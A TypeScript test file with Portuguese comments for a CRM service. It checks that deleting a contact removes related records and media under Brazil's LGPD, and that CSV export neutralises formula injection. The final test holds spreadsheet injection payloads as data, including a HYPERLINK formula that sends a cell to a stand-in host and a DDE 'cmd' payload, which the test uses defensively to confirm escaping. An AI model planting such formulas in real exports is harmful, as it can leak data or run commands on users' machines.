import { describe, it, expect, beforeAll, beforeEach, vi } from "vitest";
import { basePrisma } from "@crmagro/db";
import { runWithTeam } from "../test-support/identidade";

/**
 * Exclusão de contato que apaga tudo (item 3.7, S15 — LGPD) e CSV sem fórmula
 * (S14). A fila de limpeza e o Storage são MOCKADOS: nada sai para o Supabase.
 */
const limpeza = vi.hoisted(() => ({
  enfileirar: vi.fn(async (_teamId: string, paths: string[]) => new Set(paths).size),
  remover: vi.fn(async (_paths: string[]) => {}),
}));
vi.mock("../storage/limpeza", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../storage/limpeza")>()),
  enfileirarLimpezaDeMidia: limpeza.enfileirar,
}));
vi.mock("../storage/service", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../storage/service")>()),
  removerMidias: limpeza.remover,
}));

const { remove, removeMany, mergeContacts } = await import("./service");
const { processarLimpezaDeMidia } = await import("../storage/limpeza");
const { rowsToCsv, EXPORT_COLUMNS } = await import("./export");

const TEAM = "00000000-0000-0000-0000-0000000004a4";
const TEAM_B = "00000000-0000-0000-0000-0000000004a5";

async function limpar(teamId: string) {
  const w = { teamId };
  await basePrisma.enrichmentFact.deleteMany({ where: w });
  await basePrisma.contactCompany.deleteMany({ where: w });
  await basePrisma.company.deleteMany({ where: w });
  await basePrisma.activity.deleteMany({ where: w });
  await basePrisma.message.deleteMany({ where: w });
  await basePrisma.conversation.deleteMany({ where: w });
  await basePrisma.channelIdentifier.deleteMany({ where: w });
  await basePrisma.contact.deleteMany({ where: w });
}

const fato = (teamId: string, targetType: string, targetId: string) =>
  basePrisma.enrichmentFact.create({
    data: {
      teamId,
      targetType,
      targetId,
      field: "ie",
      value: "123",
      enricherKey: "cnpj",
      enricherVersion: "t",
      source: "teste",
    },
  });

/** Contato com mídia (mensagem + atividade), fato próprio e empresa só dele. */
async function contatoCompleto(teamId: string, nome: string) {
  const c = await basePrisma.contact.create({ data: { teamId, nome } });
  const conv = await basePrisma.conversation.create({ data: { teamId, contactId: c.id, canal: "whatsapp" } });
  await basePrisma.message.create({
    data: { teamId, conversationId: conv.id, direcao: "in", tipo: "audio", mediaPath: `${conv.id}/audio.ogg` },
  });
  await basePrisma.activity.create({
    data: { teamId, contactId: c.id, tipo: "whatsapp", direcao: "in", mediaPath: `${conv.id}/audio.ogg` },
  });
  await basePrisma.activity.create({
    data: { teamId, contactId: c.id, tipo: "note", direcao: "out", mediaPath: `deals/x/${c.id}.pdf` },
  });
  const empresa = await basePrisma.company.create({ data: { teamId, nome: `Empresa de ${nome}` } });
  await basePrisma.contactCompany.create({ data: { teamId, contactId: c.id, companyId: empresa.id } });
  await fato(teamId, "contact", c.id);
  await fato(teamId, "company", empresa.id);
  return { id: c.id, empresaId: empresa.id, conversaId: conv.id };
}

beforeAll(async () => {
  for (const [id, name] of [
    [TEAM, "Team exclusão (test)"],
    [TEAM_B, "Team exclusão B (test)"],
  ] as const) {
    await basePrisma.team.upsert({ where: { id }, update: {}, create: { id, name } });
  }
});
beforeEach(async () => {
  limpeza.enfileirar.mockClear();
  limpeza.remover.mockClear();
  await limpar(TEAM);
  await limpar(TEAM_B);
});

describe("excluir contato apaga tudo (LGPD)", () => {
  it("apaga fatos do contato e da empresa que ficou sem vínculo, e enfileira as mídias", async () => {
    const a = await contatoCompleto(TEAM, "Ana");
    // Empresa compartilhada com outro contato: os fatos dela ficam.
    const outro = await basePrisma.contact.create({ data: { teamId: TEAM, nome: "Outro" } });
    const compartilhada = await basePrisma.company.create({ data: { teamId: TEAM, nome: "Compartilhada" } });
    await basePrisma.contactCompany.createMany({
      data: [
        { teamId: TEAM, contactId: a.id, companyId: compartilhada.id },
        { teamId: TEAM, contactId: outro.id, companyId: compartilhada.id },
      ],
    });
    await fato(TEAM, "company", compartilhada.id);

    await runWithTeam(TEAM, () => remove(a.id));

    expect(await basePrisma.contact.findUnique({ where: { id: a.id } })).toBeNull();
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM, targetId: a.id } })).toBe(0);
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM, targetId: a.empresaId } })).toBe(0);
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM, targetId: compartilhada.id } })).toBe(1);
    // Mídia da mensagem e da atividade (mesmo arquivo conta uma vez) + anexo.
    expect(limpeza.enfileirar).toHaveBeenCalledTimes(1);
    const [time, paths] = limpeza.enfileirar.mock.calls[0]!;
    expect(time).toBe(TEAM);
    expect(new Set(paths)).toEqual(new Set([`${a.conversaId}/audio.ogg`, `deals/x/${a.id}.pdf`]));
  });

  it("em lote, só apaga do próprio time (id de outro time é ignorado)", async () => {
    const a = await contatoCompleto(TEAM, "Ana");
    const b = await contatoCompleto(TEAM_B, "Bia");
    const r = await runWithTeam(TEAM, () => removeMany([a.id, b.id]));
    expect(r.deleted).toBe(1);
    expect(await basePrisma.contact.findUnique({ where: { id: b.id } })).not.toBeNull();
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM_B } })).toBe(2);
    expect(limpeza.enfileirar.mock.calls.every(([t]) => t === TEAM)).toBe(true);
  });

  it("se a fila da limpeza não aceitar, nada é apagado", async () => {
    const a = await contatoCompleto(TEAM, "Ana");
    limpeza.enfileirar.mockRejectedValueOnce(new Error("redis fora"));
    await expect(runWithTeam(TEAM, () => remove(a.id))).rejects.toThrow("redis fora");
    expect(await basePrisma.contact.findUnique({ where: { id: a.id } })).not.toBeNull();
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM, targetId: a.id } })).toBe(1);
  });

  it("o job só apaga do Storage o que nenhuma linha do time usa mais", async () => {
    const a = await contatoCompleto(TEAM, "Ana");
    const r = await processarLimpezaDeMidia({ teamId: TEAM, paths: [`${a.conversaId}/audio.ogg`, "orfa/arquivo.jpg"] });
    expect(r).toEqual({ apagados: 1, mantidos: 1 });
    expect(limpeza.remover).toHaveBeenCalledWith(["orfa/arquivo.jpg"]);
  });

  it("unificar leva os fatos do duplicado para o contato mantido", async () => {
    const keep = await basePrisma.contact.create({ data: { teamId: TEAM, nome: "Mantido" } });
    const dup = await basePrisma.contact.create({ data: { teamId: TEAM, nome: "Duplicado" } });
    await fato(TEAM, "contact", dup.id);
    await runWithTeam(TEAM, () => mergeContacts(keep.id, [dup.id]));
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM, targetId: keep.id } })).toBe(1);
    expect(await basePrisma.enrichmentFact.count({ where: { teamId: TEAM, targetId: dup.id } })).toBe(0);
  });
});

describe("CSV sem injeção de fórmula (S14)", () => {
  const linha = (nome: string, telefone = "") =>
    Object.fromEntries(EXPORT_COLUMNS.map((c) => [c.key, c.key === "nome" ? nome : c.key === "telefone" ? telefone : ""]));

  it("célula que viraria fórmula ganha apóstrofo; telefone e texto comum ficam como estão", () => {
    const csv = rowsToCsv([
      linha('=HYPERLINK("http://x/?"&A2,"clique")', "+5565999991234"),
      linha("@SUM(1+1)", "-65 3333-4444"),
      linha("+cmd|' /C calc'!A0"),
      linha("-2+3"),
      linha("João da Silva"),
    ] as never);
    expect(csv).toContain(`"'=HYPERLINK(""http://x/?""&A2,""clique"")"`);
    expect(csv).toContain(`"'@SUM(1+1)"`);
    expect(csv).toContain(`"'+cmd|' /C calc'!A0"`);
    expect(csv).toContain(`"'-2+3"`);
    expect(csv).toContain("+5565999991234");
    expect(csv).not.toContain("'+5565999991234");
    expect(csv).not.toContain("'-65 3333-4444");
    expect(csv).toContain("João da Silva");
  });
});
